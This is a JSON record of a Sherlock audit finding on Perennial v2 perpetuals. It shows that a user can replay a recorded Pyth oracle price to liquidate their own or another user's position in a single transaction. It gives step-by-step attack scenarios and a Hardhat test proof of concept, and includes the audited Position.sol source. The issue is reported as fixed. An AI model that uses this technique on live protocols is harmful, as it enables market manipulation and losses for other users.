{
  "Title": "M-6: It is possible to open and liquidate your own position in 1 transaction to overcome efficiency and liquidity removal limits at almost no cost",
  "Content": "# Issue M-6: It is possible to open and liquidate your own position in 1 transaction to overcome efficiency and liquidity removal limits at almost no cost \n\nSource: https://github.com/sherlock-audit/2023-07-perennial-judging/issues/104 \n\n## Found by \nEmmanuel, panprog\n\nThe way the protocol is setup, it is possible to open positions or withdraw collateral up to exactly maintenance limit (some percentage of notional). However, this means that it's possible to be at almost liquidation level intentionally and moreover, the current oracle setup allows to open and immediately liquidate your own position in 1 transaction, effectively bypassing efficiency and liquidity removal limits, paying only the keeper (and possible position open/close) fees, causing all kinds of malicious activity which can harm the protocol.\n\n## Vulnerability Detail\n\nThe user can liquidate his own position with 100% guarantee in 1 transaction by following these steps:\n1. It can be done on existing position or on a new position\n2. Record Pyth oracle prices with signatures until you encounter a price which is higher (or lower, depending on your position direction) than latest oracle version price by any amount.\n3. In 1 transaction do the following:\n3.1. Make the position you want to liquidate at exactly the edge of liquidation: withdraw maximum allowed amount or open a new position with minimum allowed collateral\n3.2. Commit non-requested oracle version with the price recorded earlier (this price makes the position liquidatable)\n3.3. Liquidate your position (it will be allowed, because the position generates a minimum loss due to price change and becomes liquidatable)\n\nSince all liquidation fee is given to user himself, liquidation of own position is almost free for the user (only the keeper and position open/close fee is paid if any).\n\n## Impact\n\nThere are different malicious actions scenarios possible which can abuse this issue and overcome efficiency and liquidity removal limitations (as they're ignored when liquidating positions), such as:\n- Open large maker and long or short position, then liquidate maker to cause mismatch between long/short and maker (socialize positions). This will cause some chaos in the market, disbalance between long and short profit/loss and users will probably start leaving such chaotic market, so while this attack is not totally free, it's cheap enough to drive users away from competition.\n- Open large maker, wait for long and/or short positions from normal users to accumulate, then liquidate most of the large maker position, which will drive taker interest very high and remaining small maker position will be able to accumulate big profit with a small risk.\n- Just open long/short position from different accounts and wait for the large price update and frontrun it by withdrawing max collateral from the position which will be in a loss, and immediately liquidate it in the same transaction: with large price update one position will be liquidated with bad debt while the other position will be in a large profit, total profit from both positions will be positive and basically risk-free, meaning it's at the expense of the other users. While this strategy is possible to do on its own, liquidation in the same transaction allows it to be more profitable and catch more opportunities, meaning more damage to the other protocol users.\n\nThe same core reason can also cause unsuspecting user to be unexpectedly liquidated in the following scenario:\n1. User opens position (10 ETH long at $1000, with $10000 collateral). User is choosing very safe leverage = 1. Market maintenance is set to 20% (max leverage = 5)\n2. Some time later the price is still $1000 and user decides to close most of his position and withdraw collateral, so he reduces his position to 2 ETH long and withdraws $8000 collateral, leaving his position with $2000 collateral. It appears that the user is at the safe leverage = 1 again.\n3. Right in the same block the liquidator commits non-requested oracle with a price $999.999 and immediately liquidates the user.\n\nThe user is unsuspectedly liquidated even though he thought that he was at leverage = 1. But since collateral is withdrawn immediately, but position changes only later, user actually brought his position to max leverage and got liquidated. While this might be argued to be the expected behavior, it might still be hard to understand and unintuitive for many users, so it's better to prevent such situation from happening and the fix is the same as the one to fix self-liquidations.\n\n## Proof of concept\n\nThe scenario of liquidating unsuspecting user is demonstrated in the test, add this to test/unit/market/Market.test.ts:\n```solidity\nit('panprog liquidate unsuspecting user / self in 1 transaction', async () => {\n\n    function setupOracle(price: string, timestamp : number, nextTimestamp : number) {\n        const oracleVersion = {\n        price: parse6decimal(price),\n        timestamp: timestamp,\n        valid: true,\n        }\n        oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion)\n        oracle.status.returns([oracleVersion, nextTimestamp])\n        oracle.request.returns()\n    }\n\n    var riskParameter = {\n        maintenance: parse6decimal('0.2'),\n        takerFee: parse6decimal('0.00'),\n        takerSkewFee: 0,\n        takerImpactFee: 0,\n        makerFee: parse6decimal('0.00'),\n        makerImpactFee: 0,\n        makerLimit: parse6decimal('1000'),\n        efficiencyLimit: parse6decimal('0.2'),\n        liquidationFee: parse6decimal('0.50'),\n        minLiquidationFee: parse6decimal('10'),\n        maxLiquidationFee: parse6decimal('1000'),\n        utilizationCurve: {\n        minRate: parse6decimal('0.0'),\n        maxRate: parse6decimal('1.00'),\n        targetRate: parse6decimal('0.10'),\n        targetUtilization: parse6decimal('0.50'),\n        },\n        pController: {\n        k: parse6decimal('40000'),\n        max: parse6decimal('1.20'),\n        },\n        minMaintenance: parse6decimal('10'),\n        virtualTaker: parse6decimal('0'),\n        staleAfter: 14400,\n        makerReceiveOnly: false,\n    }\n    var marketParameter = {\n        fundingFee: parse6decimal('0.0'),\n        interestFee: parse6decimal('0.0'),\n        oracleFee: parse6decimal('0.0'),\n        riskFee: parse6decimal('0.0'),\n        positionFee: parse6decimal('0.0'),\n        maxPendingGlobal: 5,\n        maxPendingLocal: 3,\n        settlementFee: parse6decimal('0'),\n        makerRewardRate: parse6decimal('0'),\n        longRewardRate: parse6decimal('0'),\n        shortRewardRate: parse6decimal('0'),\n        makerCloseAlways: false,\n        takerCloseAlways: false,\n        closed: false,\n    }\n        \n    await market.connect(owner).updateRiskParameter(riskParameter);\n    await market.connect(owner).updateParameter(marketParameter);\n\n    setupOracle('100', TIMESTAMP, TIMESTAMP + 100);\n\n    var collateral = parse6decimal('1000')\n    dsu.transferFrom.whenCalledWith(userB.address, market.address, collateral.mul(1e12)).returns(true)\n    await market.connect(userB).update(userB.address, parse6decimal('10.000'), 0, 0, collateral, false)\n\n    var collateral = parse6decimal('100')\n    dsu.transferFrom.whenCalledWith(user.address, market.address, collateral.mul(1e12)).returns(true)\n    await market.connect(user).update(user.address, 0, parse6decimal('1.000'), 0, collateral, false)\n\n    // settle\n    setupOracle('100', TIMESTAMP + 100, TIMESTAMP + 200);\n    await market.connect(userB).update(userB.address, parse6decimal('10.000'), 0, 0, 0, false)\n    await market.connect(user).update(user.address, 0, parse6decimal('1.000'), 0, 0, false)\n\n    // withdraw\n    var collateral = parse6decimal('800')\n    dsu.transfer.whenCalledWith(userB.address, collateral.mul(1e12)).returns(true)\n    await market.connect(userB).update(userB.address, parse6decimal('2.000'), 0, 0, collateral.mul(-1), false)\n\n    // liquidate unsuspecting user\n    setupOracle('100.01', TIMESTAMP + 150, TIMESTAMP + 200);\n    const EXPECTED_LIQUIDATION_FEE = parse6decimal('100.01')\n    dsu.transfer.whenCalledWith(liquidator.address, EXPECTED_LIQUIDATION_FEE.mul(1e12)).returns(true)\n    dsu.balanceOf.whenCalledWith(market.address).returns(COLLATERAL.mul(1e12))\n    await market.connect(liquidator).update(userB.address, 0, 0, 0, EXPECTED_LIQUIDATION_FEE.mul(-1), true)\n\n    setupOracle('100.01', TIMESTAMP + 200, TIMESTAMP + 300);\n    await market.connect(userB).update(userB.address, 0, 0, 0, 0, false)\n\n    var info = await market.locals(userB.address);\n    var pos = await market.positions(userB.address);\n    console.log(\"Liquidated maker: collateral = \" + info.collateral + \" maker = \" + pos.maker);\n\n})\n```\n\nConsole output for the code:\n```solidity\nLiquidated maker: collateral = 99980000 maker = 0\n```\n\nSelf liquidation is the same, just the liquidator does this in 1 transaction and is owned by userB.\n\n## Code Snippet\n\nAccount solvency is calculated as meeting the minimum collateral of maintenance (percentage of notional):\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/types/Position.sol#L305\n\nIt is possible to bring user to exactly the edge of liquidation, when minimum loss makes him liquidatable.\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nIndustry standard is to have initial margin (margin required to open position or withdraw collateral) and maintenance margin (margin required to keep the position solvent). Initial margin > maintenance margin and serves exactly for the reason to prevent users from being close to liquidation, intentional or not. I suggest to implement initial margin as a measure to prevent such self liquidation or unsuspected user liquidations. This will improve user experience (remove a lot of surprise liquidations) and will also improve security by disallowing intentional liquidations and cheaply overcoming the protocol limits such as efficiency limit: intentional liquidations are never good for the protocol as they're most often malicious, so having the ability to liquidate yourself in 1 transaction should definetely be prohibited.\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**__141345__** commented:\n> m\n\n\n\n**arjun-io**\n\nThe self liquidations do seem possible here, we'll look further into the downstream impacts to figure out any fixes we want to implement.\n\n**arjun-io**\n\nFixed: https://github.com/equilibria-xyz/perennial-v2/pull/92\n\n",
  "Impact": "MEDIUM",
  "Source": "https://app.sherlock.xyz/audits/contests/106",
  "Code": [
    {
      "filename": "perennial-v2/packages/perennial/contracts/types/Position.sol",
      "content": "// SPDX-License-Identifier: Apache-2.0\npragma solidity ^0.8.13;\n\nimport \"./OracleVersion.sol\";\nimport \"./RiskParameter.sol\";\nimport \"./Order.sol\";\nimport \"./Global.sol\";\nimport \"./Local.sol\";\n\n/// @dev Order type\nstruct Position {\n    /// @dev The timestamp of the position\n    uint256 timestamp;\n\n    /// @dev The maker position size\n    UFixed6 maker;\n\n    /// @dev The long position size\n    UFixed6 long;\n\n    /// @dev The short position size\n    UFixed6 short;\n\n    /// @dev The fee for the position (only used for pending positions)\n    UFixed6 fee;\n\n    /// @dev The fixed settlement fee for the position (only used for pending positions)\n    UFixed6 keeper;\n\n    /// @dev The collateral at the time of the position settlement (only used for pending positions)\n    Fixed6 collateral;\n\n    /// @dev The change in collateral during this position (only used for pending positions)\n    Fixed6 delta;\n}\nusing PositionLib for Position global;\nstruct PositionStorageGlobal { uint256 slot0; uint256 slot1; }\nusing PositionStorageGlobalLib for PositionStorageGlobal global;\nstruct PositionStorageLocal { uint256 slot0; uint256 slot1; }\nusing PositionStorageLocalLib for PositionStorageLocal global;\n\n/// @title Position\n/// @notice Holds the state for a position\nlibrary PositionLib {\n    /// @notice Returns whether the position is ready to be settled\n    /// @param self The position object to check\n    /// @param latestVersion The latest oracle version\n    /// @return Whether the position is ready to be settled\n    function ready(Position memory self, OracleVersion memory latestVersion) internal pure returns (bool) {\n        return latestVersion.timestamp >= self.timestamp;\n    }\n\n    /// @notice Replaces the position with the new latest position\n    /// @param self The position object to update\n    /// @param newPosition The new latest position\n    function update(Position memory self, Position memory newPosition) internal pure {\n        (self.timestamp, self.maker, self.long, self.short) = (\n            newPosition.timestamp,\n            newPosition.maker,\n            newPosition.long,\n            newPosition.short\n        );\n    }\n\n    /// @notice Updates the current local position with a new order\n    /// @param self The position object to update\n    /// @param currentTimestamp The current timestamp\n    /// @param newMaker The new maker position\n    /// @param newLong The new long position\n    /// @param newShort The new short position\n    /// @return newOrder The new order\n    function update(\n        Position memory self,\n        uint256 currentTimestamp,\n        UFixed6 newMaker,\n        UFixed6 newLong,\n        UFixed6 newShort\n    ) internal pure returns (Order memory newOrder) {\n        (newOrder.maker, newOrder.long, newOrder.short) = (\n            Fixed6Lib.from(newMaker).sub(Fixed6Lib.from(self.maker)),\n            Fixed6Lib.from(newLong).sub(Fixed6Lib.from(self.long)),\n            Fixed6Lib.from(newShort).sub(Fixed6Lib.from(self.short))\n        );\n\n        (self.timestamp, self.maker, self.long, self.short) =\n            (currentTimestamp, newMaker, newLong, newShort);\n    }\n\n    /// @notice Updates the current global position with a new order\n    /// @param self The position object to update\n    /// @param currentTimestamp The current timestamp\n    /// @param order The new order\n    /// @param riskParameter The current risk parameter\n    function update(\n        Position memory self,\n        uint256 currentTimestamp,\n        Order memory order,\n        RiskParameter memory riskParameter\n    ) internal pure {\n        // load the computed attributes of the latest position\n        Fixed6 latestSkew = virtualSkew(self, riskParameter);\n        (order.net, order.efficiency, order.utilization) =\n            (Fixed6Lib.from(net(self)), Fixed6Lib.from(efficiency(self)), Fixed6Lib.from(utilization(self)));\n\n        // update the position's attributes\n        (self.timestamp, self.maker, self.long, self.short) = (\n            currentTimestamp,\n            UFixed6Lib.from(Fixed6Lib.from(self.maker).add(order.maker)),\n            UFixed6Lib.from(Fixed6Lib.from(self.long).add(order.long)),\n            UFixed6Lib.from(Fixed6Lib.from(self.short).add(order.short))\n        );\n\n        // update the order's delta attributes with the positions updated attributes\n        (order.net, order.skew, order.impact, order.efficiency, order.utilization) = (\n            Fixed6Lib.from(net(self)).sub(order.net),\n            virtualSkew(self, riskParameter).sub(latestSkew).abs(),\n            Fixed6Lib.from(virtualSkew(self, riskParameter).abs()).sub(Fixed6Lib.from(latestSkew.abs())),\n            Fixed6Lib.from(efficiency(self)).sub(order.efficiency),\n            Fixed6Lib.from(utilization(self)).sub(order.utilization)\n        );\n    }\n\n    /// @notice prepares the position for the next id\n    /// @param self The position object to update\n    function prepare(Position memory self) internal pure {\n        self.fee = UFixed6Lib.ZERO;\n        self.keeper = UFixed6Lib.ZERO;\n        self.collateral = Fixed6Lib.ZERO;\n    }\n\n    /// @notice Updates the collateral delta of the position\n    /// @param self The position object to update\n    /// @param collateralAmount The amount of collateral change that occurred\n    function update(Position memory self, Fixed6 collateralAmount) internal pure {\n        self.delta = self.delta.add(collateralAmount);\n    }\n\n    /// @notice Processes an invalidation of the position\n    /// @dev Replaces the maker, long, and short positions with the latest valid version's\n    /// @param self The position object to update\n    /// @param latestPosition The latest valid position\n    function invalidate(Position memory self, Position memory latestPosition) internal pure {\n        (self.maker, self.long, self.short, self.fee) = (\n            latestPosition.maker,\n            latestPosition.long,\n            latestPosition.short,\n            UFixed6Lib.ZERO\n        );\n    }\n\n    /// @notice Processes a sync of the position\n    /// @dev Moves the timestamp forward to the latest version's timestamp, while resetting the fee and keeper\n    /// @param self The position object to update\n    /// @param latestVersion The latest oracle version\n    function sync(Position memory self, OracleVersion memory latestVersion) internal pure {\n        (self.timestamp, self.fee, self.keeper) = (latestVersion.timestamp, UFixed6Lib.ZERO, UFixed6Lib.ZERO);\n    }\n\n    /// @notice Registers the fees from a new order\n    /// @param self The position object to update\n    /// @param order The new order\n    function registerFee(Position memory self, Order memory order) internal pure {\n        self.fee = self.fee.add(order.fee);\n        self.keeper = self.keeper.add(order.keeper);\n    }\n\n    /// @notice Returns the maximum position size\n    /// @param self The position object to check\n    /// @return The maximum position size\n    function magnitude(Position memory self) internal pure returns (UFixed6) {\n        return self.long.max(self.short).max(self.maker);\n    }\n\n    /// @notice Returns the maximum taker position size\n    /// @param self The position object to check\n    /// @return The maximum taker position size\n    function major(Position memory self) internal pure returns (UFixed6) {\n        return self.long.max(self.short);\n    }\n\n    /// @notice Returns the minimum maker position size\n    /// @param self The position object to check\n    /// @return The minimum maker position size\n    function minor(Position memory self) internal pure returns (UFixed6) {\n        return self.long.min(self.short);\n    }\n\n    /// @notice Returns the difference between the long and short positions\n    /// @param self The position object to check\n    /// @return The difference between the long and short positions\n    function net(Position memory self) internal pure returns (UFixed6) {\n        return Fixed6Lib.from(self.long).sub(Fixed6Lib.from(self.short)).abs();\n    }\n\n    /// @notice Returns the skew of the position\n    /// @dev skew = (long - short) / max(long, short)\n    /// @param self The position object to check\n    /// @return The skew of the position\n    function skew(Position memory self) internal pure returns (Fixed6) {\n        return _skew(self, UFixed6Lib.ZERO);\n    }\n\n    /// @notice Returns the skew of the position taking into account the virtual taker\n    /// @dev virtual skew = (long - short) / (max(long, short) + virtualTaker)\n    /// @param self The position object to check\n    /// @param riskParameter The current risk parameter\n    /// @return The virtual skew of the position\n    function virtualSkew(Position memory self, RiskParameter memory riskParameter) internal pure returns (Fixed6) {\n        return _skew(self, riskParameter.virtualTaker);\n    }\n\n    /// @notice Helper function to return the skew of the position with an optional virtual taker\n    /// @param self The position object to check\n    /// @param virtualTaker The virtual taker to use in the calculation\n    /// @return The virtual skew of the position\n    function _skew(Position memory self, UFixed6 virtualTaker) internal pure returns (Fixed6) {\n        return major(self).isZero() ?\n            Fixed6Lib.ZERO :\n            Fixed6Lib.from(self.long)\n                .sub(Fixed6Lib.from(self.short))\n                .div(Fixed6Lib.from(major(self).add(virtualTaker)));\n    }\n\n    /// @notice Returns the utilization of the position\n    /// @dev utilization = major / (maker + minor)\n    /// @param self The position object to check\n    /// @return The utilization of the position\n    function utilization(Position memory self) internal pure returns (UFixed6) {\n        return major(self).unsafeDiv(self.maker.add(minor(self))).min(UFixed6Lib.ONE);\n    }\n\n    /// @notice Returns the long position with socialization taken into account\n    /// @param self The position object to check\n    /// @return The long position with socialization taken into account\n    function longSocialized(Position memory self) internal pure returns (UFixed6) {\n        return self.maker.add(self.short).min(self.long);\n    }\n\n    /// @notice Returns the short position with socialization taken into account\n    /// @param self The position object to check\n    /// @return The short position with socialization taken into account\n    function shortSocialized(Position memory self) internal pure returns (UFixed6) {\n        return self.maker.add(self.long).min(self.short);\n    }\n\n    /// @notice Returns the major position with socialization taken into account\n    /// @param self The position object to check\n    /// @return The major position with socialization taken into account\n    function takerSocialized(Position memory self) internal pure returns (UFixed6) {\n        return major(self).min(minor(self).add(self.maker));\n    }\n\n    /// @notice Returns the efficiency of the position\n    /// @dev efficiency = maker / major\n    /// @param self The position object to check\n    /// @return The efficiency of the position\n    function efficiency(Position memory self) internal pure returns (UFixed6) {\n        return self.maker.unsafeDiv(major(self)).min(UFixed6Lib.ONE);\n    }\n\n    /// @notice Returns the whether the position is socialized\n    /// @param self The position object to check\n    /// @return Whether the position is socialized\n    function socialized(Position memory self) internal pure returns (bool) {\n        return self.maker.add(self.short).lt(self.long) || self.maker.add(self.long).lt(self.short);\n    }\n\n    /// @notice Returns the whether the position is single-sided\n    /// @param self The position object to check\n    /// @return Whether the position is single-sided\n    function singleSided(Position memory self) internal pure returns (bool) {\n        return magnitude(self).eq(self.maker.add(self.long).add(self.short));\n    }\n\n    /// @notice Returns the maintenance requirement of the position\n    /// @param self The position object to check\n    /// @param latestVersion The latest oracle version\n    /// @param riskParameter The current risk parameter\n    /// @return The maintenance requirement of the position\n    function maintenance(\n        Position memory self,\n        OracleVersion memory latestVersion,\n        RiskParameter memory riskParameter\n    ) internal pure returns (UFixed6) {\n        if (magnitude(self).isZero()) return UFixed6Lib.ZERO;\n        return magnitude(self)\n            .mul(latestVersion.price.abs())\n            .mul(riskParameter.maintenance)\n            .max(riskParameter.minMaintenance);\n    }\n\n    /// @notice Returns the whether the position is collateralized\n    /// @dev shortfall is considered solvent for 0-position\n    /// @param self The position object to check\n    /// @param latestVersion The latest oracle version\n    /// @param riskParameter The current risk parameter\n    /// @param collateral The current account's collateral\n    /// @return Whether the position is collateralized\n    function collateralized(\n        Position memory self,\n        OracleVersion memory latestVersion,\n        RiskParameter memory riskParameter,\n        Fixed6 collateral\n    ) internal pure returns (bool) {\n        return collateral.max(Fixed6Lib.ZERO).gte(Fixed6Lib.from(maintenance(self, latestVersion, riskParameter)));\n    }\n\n    /// @notice Returns the liquidation fee of the position\n    /// @param self The position object to check\n    /// @param latestVersion The latest oracle version\n    /// @param riskParameter The current risk parameter\n    /// @return The liquidation fee of the position\n    function liquidationFee(\n        Position memory self,\n        OracleVersion memory latestVersion,\n        RiskParameter memory riskParameter\n    ) internal pure returns (UFixed6) {\n        return maintenance(self, latestVersion, riskParameter)\n            .mul(riskParameter.liquidationFee)\n            .min(riskParameter.maxLiquidationFee)\n            .max(riskParameter.minLiquidationFee);\n    }\n}\n\n/// @dev Manually encodes and decodes the global Position struct into storage.\n///\n///     struct StoredPositionGlobal {\n///         /* slot 0 */\n///         uint32 timestamp;\n///         uint64 maker;\n///         uint64 long;\n///         uint64 short;\n///\n///         /* slot 1 */\n///         uint64 fee;\n///         uint64 keeper;\n///     }\n///\nlibrary PositionStorageGlobalLib {\n    function read(PositionStorageGlobal storage self) internal view returns (Position memory) {\n        (uint256 slot0, uint256 slot1) = (self.slot0, self.slot1);\n        return Position(\n            uint256(slot0 << (256 - 32)) >> (256 - 32),\n            UFixed6.wrap(uint256(slot0 << (256 - 32 - 64)) >> (256 - 64)),\n            UFixed6.wrap(uint256(slot0 << (256 - 32 - 64 - 64)) >> (256 - 64)),\n            UFixed6.wrap(uint256(slot0 << (256 - 32 - 64 - 64 - 64)) >> (256 - 64)),\n            UFixed6.wrap(uint256(slot1 << (256 - 64)) >> (256 - 64)),\n            UFixed6.wrap(uint256(slot1 << (256 - 64 - 64)) >> (256 - 64)),\n            Fixed6Lib.ZERO,\n            Fixed6Lib.ZERO\n        );\n    }\n\n    function store(PositionStorageGlobal storage self, Position memory newValue) internal {\n        PositionStorageLib.validate(newValue);\n\n        uint256 encoded0 =\n            uint256(newValue.timestamp << (256 - 32)) >> (256 - 32) |\n            uint256(UFixed6.unwrap(newValue.maker) << (256 - 64)) >> (256 - 32 - 64) |\n            uint256(UFixed6.unwrap(newValue.long) << (256 - 64)) >> (256 - 32 - 64 - 64) |\n            uint256(UFixed6.unwrap(newValue.short) << (256 - 64)) >> (256 - 32 - 64 - 64 - 64);\n        uint256 encoded1 =\n            uint256(UFixed6.unwrap(newValue.fee) << (256 - 64)) >> (256 - 64) |\n            uint256(UFixed6.unwrap(newValue.keeper) << (256 - 64)) >> (256 - 64 - 64);\n\n        assembly {\n            sstore(self.slot, encoded0)\n            sstore(add(self.slot, 1), encoded1)\n        }\n    }\n}\n\n/// @dev Manually encodes and decodes the local Position struct into storage.\n///\n///     struct StoredPositionLocal {\n///         /* slot 0 */\n///         uint32 timestamp;\n///         uint8 direction;\n///         uint64 magnitude;\n///         int64 collateral;\n///         int64 delta;\n///\n///         /* slot 1 */\n///         uint64 fee;\n///         uint64 keeper;\n///     }\n///\nlibrary PositionStorageLocalLib {\n    function read(PositionStorageLocal storage self) internal view returns (Position memory) {\n        (uint256 slot0, uint256 slot1) = (self.slot0, self.slot1);\n\n        uint256 direction = uint256(slot0 << (256 - 32 - 8)) >> (256 - 8);\n        UFixed6 magnitude = UFixed6.wrap(uint256(slot0 << (256 - 32 - 8 - 64)) >> (256 - 64));\n\n        return Position(\n            uint256(slot0 << (256 - 32)) >> (256 - 32),\n            direction == 0 ? magnitude : UFixed6Lib.ZERO,\n            direction == 1 ? magnitude : UFixed6Lib.ZERO,\n            direction == 2 ? magnitude : UFixed6Lib.ZERO,\n            UFixed6.wrap(uint256(slot1 << (256 - 64)) >> (256 - 64)),\n            UFixed6.wrap(uint256(slot1 << (256 - 64 - 64)) >> (256 - 64)),\n            Fixed6.wrap(int256(slot0 << (256 - 32 - 8 - 64 - 64)) >> (256 - 64)),\n            Fixed6.wrap(int256(slot0 << (256 - 32 - 8 - 64 - 64 - 64)) >> (256 - 64))\n        );\n    }\n\n    function store(PositionStorageLocal storage self, Position memory newValue) internal {\n        PositionStorageLib.validate(newValue);\n\n        uint256 direction = newValue.long.isZero() ? (newValue.short.isZero() ? 0 : 2) : 1;\n\n        uint256 encoded0 =\n            uint256(newValue.timestamp << (256 - 32)) >> (256 - 32) |\n            uint256(direction << (256 - 8)) >> (256 - 32 - 8) |\n            uint256(UFixed6.unwrap(newValue.magnitude()) << (256 - 64)) >> (256 - 32 - 8 - 64) |\n            uint256(Fixed6.unwrap(newValue.collateral) << (256 - 64)) >> (256 - 32 - 8 - 64 - 64) |\n            uint256(Fixed6.unwrap(newValue.delta) << (256 - 64)) >> (256 - 32 - 8 - 64 - 64 - 64);\n        uint256 encoded1 =\n            uint256(UFixed6.unwrap(newValue.fee) << (256 - 64)) >> (256 - 64) |\n            uint256(UFixed6.unwrap(newValue.keeper) << (256 - 64)) >> (256 - 64 - 64);\n\n        assembly {\n            sstore(self.slot, encoded0)\n            sstore(add(self.slot, 1), encoded1)\n        }\n    }\n}\n\nlibrary PositionStorageLib {\n    error PositionStorageInvalidError();\n\n    function validate(Position memory newValue) internal pure {\n        if (newValue.timestamp > type(uint32).max) revert PositionStorageInvalidError();\n        if (newValue.maker.gt(UFixed6.wrap(type(uint64).max))) revert PositionStorageInvalidError();\n        if (newValue.long.gt(UFixed6.wrap(type(uint64).max))) revert PositionStorageInvalidError();\n        if (newValue.short.gt(UFixed6.wrap(type(uint64).max))) revert PositionStorageInvalidError();\n        if (newValue.fee.gt(UFixed6.wrap(type(uint64).max))) revert PositionStorageInvalidError();\n        if (newValue.keeper.gt(UFixed6.wrap(type(uint64).max))) revert PositionStorageInvalidError();\n        if (newValue.collateral.gt(Fixed6.wrap(type(int64).max))) revert PositionStorageInvalidError();\n        if (newValue.collateral.lt(Fixed6.wrap(type(int64).min))) revert PositionStorageInvalidError();\n        if (newValue.delta.gt(Fixed6.wrap(type(int64).max))) revert PositionStorageInvalidError();\n        if (newValue.delta.lt(Fixed6.wrap(type(int64).min))) revert PositionStorageInvalidError();\n    }\n}"
    }
  ]
}